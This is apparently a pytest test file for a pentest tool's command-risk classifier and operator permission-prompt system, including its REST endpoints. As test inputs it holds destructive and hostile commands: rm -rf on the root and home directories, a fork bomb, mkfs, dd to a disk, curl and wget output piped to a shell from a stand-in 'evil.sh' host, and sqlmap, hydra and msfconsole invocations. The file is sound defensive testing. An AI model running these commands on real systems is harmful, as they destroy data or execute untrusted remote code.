"""
tests/test_permission_system.py — Interactive Permission Prompts.

Covers:
    - classify_command: destructive/loud/aggressive/remote-exec patterns,
    fork bomb, masscan full port, sqlmap high risk, curl|bash, safe command.
    - request_permission / decide_permission / wait_for_decision / list_pending
      / get_request / cleanup_expired / clear_decisions / check_session_cache.
    - Session cache behavior (allow-session cached, no_session_cache ignored).
    - validate_command_with_permission combined flow.
    - REST endpoints smoke tests: classify, request + pending + decide flow,
    invalid decision → 400, not found, delete/clear, cleanup.

Tests deliberately avoid the multi-second wait_for_decision timeouts by
calling decide_permission() directly and then asserting the lookup result.
Where wait_for_decision is exercised, short TTLs/short timeouts are used.
"""

from __future__ import annotations

import sys
import os
import time

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import backend.scope_guard as scope_guard
from backend.scope_guard import (
    classify_command,
    request_permission,
    decide_permission,
    wait_for_decision,
    list_pending,
    get_request,
    cleanup_expired,
    clear_decisions,
    check_session_cache,
    validate_command_with_permission,
    reset_permission_state,
    DANGER_PATTERNS,
    PermissionRequest,
)


# ─────────────────────────────────────────────────────────────
#  State isolation fixture
# ─────────────────────────────────────────────────────────────

@pytest.fixture(autouse=True)
def clean_perm_state():
    """Reset permission + scope state before AND after each test.

    The scope validator reads its config from Supabase (settings table). When
    the real DB is reachable the stored scope config can be enabled with
    unrelated targets, which would leak into classify_command() and make tests
    non-deterministic. We force scope DISABLED here; individual tests that
    need an enabled scope re-set ``scope_guard._config`` explicitly.
    """
    reset_permission_state()
    scope_guard._config = (None, {**scope_guard.DEFAULT_CONFIG, "enabled": False})
    scope_guard._block_history.clear()
    yield
    reset_permission_state()
    scope_guard._config = (None, {**scope_guard.DEFAULT_CONFIG, "enabled": False})
    scope_guard._block_history.clear()


# ─────────────────────────────────────────────────────────────
#  classify_command
# ─────────────────────────────────────────────────────────────

class TestClassifyCommand:
    def test_destructive_rm_rf_root(self):
        c = classify_command("shell", "rm -rf /", "victim")
        assert c["ok"] is True
        assert c["risk_level"] == "blocked"
        assert c["needs_permission"] is False
        assert any("destructive" in r for r in c["reasons"])

    def test_destructive_rm_rf_home(self):
        c = classify_command("shell", "rm -rf ~", "victim")
        assert c["risk_level"] == "blocked"

    def test_safe_command_no_risk(self):
        c = classify_command("shell", "ls -la /tmp", "victim")
        assert c["risk_level"] == "safe"
        assert c["needs_permission"] is False
        assert c["reasons"] == []

    def test_safe_nmap_default(self):
        c = classify_command("nmap", "nmap -sV victim", "victim")
        # default nmap is not aggressive
        assert c["risk_level"] == "safe"
        assert c["needs_permission"] is False

    def test_fork_bomb_detected(self):
        cmd = ":(){ :|:& };:"
        c = classify_command("shell", cmd, "localhost")
        assert c["risk_level"] == "blocked"
        assert any("fork-bomb" in r for r in c["reasons"])

    def test_mkfs_detected(self):
        c = classify_command("shell", "mkfs.ext4 /dev/sda1", "victim")
        assert c["risk_level"] == "blocked"

    def test_dd_to_device_detected(self):
        c = classify_command("shell", "dd if=image.iso of=/dev/sdb bs=4M", "victim")
        assert c["risk_level"] == "blocked"

    def test_shutdown_detected(self):
        c = classify_command("shell", "shutdown -h now", "victim")
        assert c["risk_level"] == "blocked"

    def test_reboot_detected(self):
        c = classify_command("shell", "reboot", "victim")
        assert c["risk_level"] == "blocked"

    def test_masscan_full_port_range(self):
        c = classify_command("masscan", "masscan victim -p1-65535 --rate=1000", "victim")
        assert c["risk_level"] == "needs-confirmation"
        assert c["needs_permission"] is True
        assert any("loud-scan" in r for r in c["reasons"])

    def test_sqlmap_high_risk_batch(self):
        c = classify_command(
            "sqlmap",
            "sqlmap -u http://victim/x --batch --risk=4 --level=5",
            "victim",
        )
        assert c["risk_level"] == "needs-confirmation"
        assert c["needs_permission"] is True
        assert any("aggressive" in r for r in c["reasons"])

    def test_hydra_loud_brute(self):
        c = classify_command(
            "hydra",
            "hydra -L users.txt -P pass.txt ssh://victim",
            "victim",
        )
        assert c["needs_permission"] is True
        assert any("loud-brute" in r for r in c["reasons"])

    def test_gobuster_high_threads_medium(self):
        c = classify_command(
            "gobuster", "gobuster dir -u http://victim -w wordlist -t 100", "victim",
        )
        assert c["needs_permission"] is True
        # medium severity → still needs-confirmation
        assert c["risk_level"] == "needs-confirmation"

    def test_curl_pipe_to_bash(self):
        c = classify_command("curl", "curl https://evil.sh/install.sh | bash", "victim")
        assert c["risk_level"] == "needs-confirmation"
        assert c["needs_permission"] is True
        assert any("remote-exec" in r for r in c["reasons"])

    def test_wget_pipe_to_sh(self):
        c = classify_command("wget", "wget -q -O - https://evil.sh/x | sh", "victim")
        assert c["needs_permission"] is True

    def test_msfconsole_detected(self):
        c = classify_command("msf", "msfconsole -q", "victim")
        assert c["needs_permission"] is True
        assert any("exploit-framework" in r for r in c["reasons"])

    def test_nmap_full_port_scan(self):
        c = classify_command("nmap", "nmap -p 1-65535 victim", "victim")
        assert c["risk_level"] == "needs-confirmation"
        assert any("loud-scan" in r for r in c["reasons"])

    def test_nmap_T5_aggressive(self):
        c = classify_command("nmap", "nmap -T5 victim", "victim")
        assert c["risk_level"] == "needs-confirmation"
        assert any("aggressive" in r for r in c["reasons"])

    def test_returns_cache_key_when_risky(self):
        c = classify_command("shell", "rm -rf /", "victim")
        assert c["cache_key"] is not None
        assert "victim" in c["cache_key"]

    def test_no_cache_key_when_safe(self):
        c = classify_command("shell", "ls -la", "victim")
        assert c["cache_key"] is None

    def test_detail_and_summary_populated(self):
        c = classify_command("shell", "rm -rf /", "victim")
        assert isinstance(c["summary"], str) and len(c["summary"]) > 0
        assert isinstance(c["detail"], str) and len(c["detail"]) > 0


# ─────────────────────────────────────────────────────────────
#  request_permission + decide_permission
# ─────────────────────────────────────────────────────────────

class TestRequestDecision:
    def test_creates_pending_request(self):
        r = request_permission("shell", "rm -rf /", "victim",
                                "Recursive delete", "destructive pattern")
        assert isinstance(r, PermissionRequest)
        assert r.status == "pending"
        assert r.tool == "shell"
        assert r.command == "rm -rf /"
        assert r.id  # uuid present
        assert r.created_at and r.expires_at

    def test_decide_allow_once(self):
        r = request_permission("shell", "rm -rf /", "victim", "s", "d")
        result = decide_permission(r.id, "allow-once", user="alice")
        assert result["status"] == "allowed-once"
        assert result["decided_by"] == "alice"
        assert result["decided_at"] is not None

    def test_decide_deny(self):
        r = request_permission("shell", "rm -rf /", "victim", "s", "d")
        result = decide_permission(r.id, "deny")
        assert result["status"] == "deny"
        assert result["decided_by"] == "operator"

    def test_decide_invalid_decision(self):
        r = request_permission("shell", "rm -rf /", "victim", "s", "d")
        result = decide_permission(r.id, "maybe")
        assert result["ok"] is False
        assert "invalid decision" in result["error"]
        # request remains pending
        assert get_request(r.id)["status"] == "pending"

    def test_decide_unknown_request(self):
        result = decide_permission("nonexistent-uuid", "allow-once")
        assert result["ok"] is False
        assert "not found" in result["error"]

    def test_decide_already_decided(self):
        r = request_permission("shell", "rm -rf /", "victim", "s", "d")
        decide_permission(r.id, "allow-once")
        second = decide_permission(r.id, "deny")
        assert second["ok"] is False
        assert "already" in second["error"]

    def test_decision_alias_normalization(self):
        r = request_permission("shell", "rm -rf /", "victim", "s", "d")
        result = decide_permission(r.id, "allow_once")
        # alias "allow_once" → canonical "allowed-once"
        assert result["status"] == "allowed-once"


# ─────────────────────────────────────────────────────────────
#  Session cache
# ─────────────────────────────────────────────────────────────

class TestSessionCache:
    def test_allow_session_caches(self):
        c = classify_command("sqlmap", "sqlmap -u http://victim --batch", "victim")
        cache_key = c["cache_key"]
        assert cache_key is None or cache_key  # may be None for safe
        # Force a key by using a risky command:
        c = classify_command("shell", "rm -rf /", "victim")
        cache_key = c["cache_key"]
        r = request_permission("shell", "rm -rf /", "victim", c["summary"], c["detail"],
                               cache_key=cache_key)
        decide_permission(r.id, "allow-session")
        assert check_session_cache(cache_key) == "allowed"

    def test_allow_once_does_not_cache(self):
        cache_key = "shell|victim|rm -rf /"
        r = request_permission("shell", "rm -rf /", "victim", "s", "d",
                                cache_key=cache_key)
        decide_permission(r.id, "allow-once")
        assert check_session_cache(cache_key) is None

    def test_no_session_cache_flag_ignored_on_allow_session(self):
        cache_key = "shell|victim|risky"
        r = request_permission("shell", "risky", "victim", "s", "d",
                                cache_key=cache_key, no_session_cache=True)
        decide_permission(r.id, "allow-session")
        # Even when allow-session chosen, no caching due to flag
        assert check_session_cache(cache_key) is None

    def test_deny_does_not_cache(self):
        cache_key = "shell|victim|rm -rf /"
        r = request_permission("shell", "rm -rf /", "victim", "s", "d",
                                cache_key=cache_key)
        decide_permission(r.id, "deny")
        assert check_session_cache(cache_key) is None

    def test_check_session_cache_unknown_returns_none(self):
        assert check_session_cache("no-such-key") is None


# ─────────────────────────────────────────────────────────────
#  wait_for_decision
# ─────────────────────────────────────────────────────────────

class TestWaitForDecision:
    def test_returns_immediately_when_already_decided(self):
        r = request_permission("shell", "rm -rf /", "victim", "s", "d")
        decide_permission(r.id, "deny")
        start = time.time()
        result = wait_for_decision(r.id, timeout=5)
        elapsed = time.time() - start
        assert result["status"] == "deny"
        # Should return near-instantly, definitely under 1s
        assert elapsed < 1.0

    def test_returns_decided_state_after_concurrent_decision(self):
        import threading
        r = request_permission("shell", "rm -rf /", "victim", "s", "d",
                                ttl_seconds=10)
        # Decider thread sleeps briefly then decides
        def decider():
            time.sleep(0.3)
            decide_permission(r.id, "allow-once")
        t = threading.Thread(target=decider)
        t.start()
        result = wait_for_decision(r.id, timeout=5)
        t.join()
        assert result["status"] == "allowed-once"

    def test_timeout_marks_expired(self):
        # Very short TTL → expires immediately
        r = request_permission("shell", "rm -rf /", "victim", "s", "d",
                                ttl_seconds=1)
        result = wait_for_decision(r.id, timeout=2)
        assert result["status"] == "expired"
        assert result["decided_by"] == "timeout"
        assert result["decided_at"] is not None

    def test_unknown_request(self):
        result = wait_for_decision("does-not-exist", timeout=1)
        assert result["status"] == "unknown"
        assert result["ok"] is False


# ─────────────────────────────────────────────────────────────
#  list_pending / get_request / cleanup_expired / clear_decisions
# ─────────────────────────────────────────────────────────────

class TestAdminFunctions:
    def test_list_pending_only_pending(self):
        r1 = request_permission("a", "cmd1", "t1", "s", "d")
        r2 = request_permission("b", "cmd2", "t2", "s", "d")
        decide_permission(r1.id, "deny")
        # r2 still pending
        pend = list_pending()
        ids = [p["id"] for p in pend]
        assert r1.id not in ids
        assert r2.id in ids

    def test_list_pending_sorted_by_created_at(self):
        r1 = request_permission("a", "cmd1", "t1", "s", "d")
        time.sleep(0.01)
        r2 = request_permission("b", "cmd2", "t2", "s", "d")
        pend = list_pending()
        idx1 = next(i for i, p in enumerate(pend) if p["id"] == r1.id)
        idx2 = next(i for i, p in enumerate(pend) if p["id"] == r2.id)
        assert idx1 < idx2

    def test_get_request_returns_dict(self):
        r = request_permission("shell", "rm -rf /", "victim", "s", "d")
        d = get_request(r.id)
        assert d is not None
        assert d["id"] == r.id
        assert d["status"] == "pending"

    def test_get_request_returns_none_for_unknown(self):
        assert get_request("nonexistent") is None

    def test_cleanup_expired_marks_timed_out(self):
        # TTL of 0 → expires by the time cleanup runs
        r = request_permission("shell", "rm -rf /", "victim", "s", "d",
                                ttl_seconds=1)
        time.sleep(1.2)  # let it expire
        count = cleanup_expired()
        assert count == 1
        assert get_request(r.id)["status"] == "expired"
        assert get_request(r.id)["decided_by"] == "timeout"

    def test_cleanup_no_pending_returns_zero(self):
        r = request_permission("shell", "rm -rf /", "victim", "s", "d",
                                ttl_seconds=60)
        count = cleanup_expired()
        assert count == 0
        # request still pending
        assert get_request(r.id)["status"] == "pending"

    def test_clear_decisions_empties_both_stores(self):
        r = request_permission("shell", "rm -rf /", "victim", "s", "d",
                                cache_key="ck1")
        decide_permission(r.id, "allow-session")
        assert check_session_cache("ck1") == "allowed"
        clear_decisions()
        assert list_pending() == []
        assert get_request(r.id) is None
        assert check_session_cache("ck1") is None


# ─────────────────────────────────────────────────────────────
#  validate_command_with_permission (combined flow)
# ─────────────────────────────────────────────────────────────

class TestValidateCommandWithPermission:
    def test_safe_command_returns_safe(self):
        result = validate_command_with_permission("ls", tool="shell", target="victim")
        assert result["ok"] is True
        assert result["blocked"] is False
        assert result["needs_permission"] is False
        assert result["risk_level"] == "safe"

    def test_critical_command_auto_blocks(self):
        result = validate_command_with_permission("rm -rf /", tool="shell",
                                                    target="victim")
        assert result["ok"] is False
        assert result["blocked"] is True
        assert result["needs_permission"] is False

    def test_high_risk_command_needs_permission(self):
        result = validate_command_with_permission(
            "msfconsole -q", tool="msf", target="victim",
        )
        assert result["ok"] is True
        assert result["needs_permission"] is True
        assert result["risk_level"] == "needs-confirmation"

    def test_session_cache_skips_prompt(self):
        cache_key = "msf|victim|msfconsole -q"
        r = request_permission("msf", "msfconsole -q", "victim", "s", "d",
                                cache_key=cache_key)
        decide_permission(r.id, "allow-session")
        # Now validate with the same command/target should skip the prompt
        result = validate_command_with_permission("msfconsole -q", tool="msf",
                                                   target="victim")
        assert result["needs_permission"] is False
        assert result.get("cached") is True
        assert result["risk_level"] == "safe"


# ─────────────────────────────────────────────────────────────
#  REST endpoint smoke tests
# ─────────────────────────────────────────────────────────────

class TestPermissionEndpoints:
    """Smoke-test the FastAPI endpoints. Uses the shared `client` conftest
    when present, else a local TestClient.
    """
    @pytest.fixture
    def client(self):
        try:
            from main import app
        except Exception:
            pytest.skip("main.app could not be imported")
        from fastapi.testclient import TestClient
        with TestClient(app) as c:
            yield c

    def test_classify_endpoint_destructive(self, client):
        resp = client.post("/api/permissions/classify", json={
            "tool": "shell", "command": "rm -rf /", "target": "victim",
        })
        assert resp.status_code == 200
        body = resp.json()
        assert body["ok"] is True
        cls = body["classification"]
        assert cls["risk_level"] == "blocked"
        assert any("destructive" in r for r in cls["reasons"])

    def test_classify_endpoint_safe(self, client):
        resp = client.post("/api/permissions/classify", json={
            "tool": "shell", "command": "ls -la", "target": "victim",
        })
        assert resp.status_code == 200
        body = resp.json()
        assert body["classification"]["risk_level"] == "safe"

    def test_request_endpoint_creates_pending(self, client):
        # Ensure DB env doesn't leak in via scope config — disable scope
        scope_guard._config = (None, {**scope_guard.DEFAULT_CONFIG, "enabled": False})
        resp = client.post("/api/permissions/request", json={
            "tool": "shell",
            "command": "rm -rf /",
            "target": "victim",
            "ttl_seconds": 60,
        })
        assert resp.status_code == 200
        body = resp.json()
        assert body["ok"] is True
        req = body["request"]
        assert req["status"] == "pending"
        # now listed in pending
        pend = client.get("/api/permissions/pending").json()
        ids = [p["id"] for p in pend["pending"]]
        assert req["id"] in ids

    def test_decide_flow_allow_once(self, client):
        scope_guard._config = (None, {**scope_guard.DEFAULT_CONFIG, "enabled": False})
        # Create
        create = client.post("/api/permissions/request", json={
            "tool": "shell", "command": "rm -rf /", "target": "victim",
            "summary": "destructive", "detail": "rm root",
            "ttl_seconds": 60,
        }).json()
        rid = create["request"]["id"]
        # Decide
        resp = client.post(f"/api/permissions/{rid}/decide", json={
            "decision": "allow-once", "user": "tester",
        })
        assert resp.status_code == 200
        body = resp.json()
        assert body["ok"] is True
        assert body["request"]["status"] == "allowed-once"
        # Still retrievable via GET
        got = client.get(f"/api/permissions/{rid}").json()
        assert got["ok"] is True
        assert got["request"]["status"] == "allowed-once"
        # No longer pending
        pend = client.get("/api/permissions/pending").json()
        ids = [p["id"] for p in pend["pending"]]
        assert rid not in ids

    def test_decide_invalid_decision_returns_400(self, client):
        scope_guard._config = (None, {**scope_guard.DEFAULT_CONFIG, "enabled": False})
        create = client.post("/api/permissions/request", json={
            "tool": "shell", "command": "rm -rf ~", "target": "victim",
            "ttl_seconds": 60,
        }).json()
        rid = create["request"]["id"]
        resp = client.post(f"/api/permissions/{rid}/decide", json={
            "decision": "maybe-so",
        })
        assert resp.status_code == 400
        body = resp.json()
        assert body["ok"] is False
        assert "invalid decision" in body["error"]

    def test_get_unknown_returns_404(self, client):
        resp = client.get("/api/permissions/does-not-exist-id")
        assert resp.status_code == 404

    def test_cleanup_endpoint(self, client):
        # Create an already-expired request via short TTL
        scope_guard._config = (None, {**scope_guard.DEFAULT_CONFIG, "enabled": False})
        client.post("/api/permissions/request", json={
            "tool": "shell", "command": "rm -rf /", "target": "victim",
            "ttl_seconds": 1,
        })
        time.sleep(1.2)
        resp = client.post("/api/permissions/cleanup")
        assert resp.status_code == 200
        body = resp.json()
        assert body["ok"] is True
        assert body["expired"] >= 1

    def test_delete_clears_all(self, client):
        scope_guard._config = (None, {**scope_guard.DEFAULT_CONFIG, "enabled": False})
        client.post("/api/permissions/request", json={
            "tool": "shell", "command": "rm -rf /", "target": "victim",
            "ttl_seconds": 60,
        })
        resp = client.delete("/api/permissions")
        assert resp.status_code == 200
        pend = client.get("/api/permissions/pending").json()
        assert pend["count"] == 0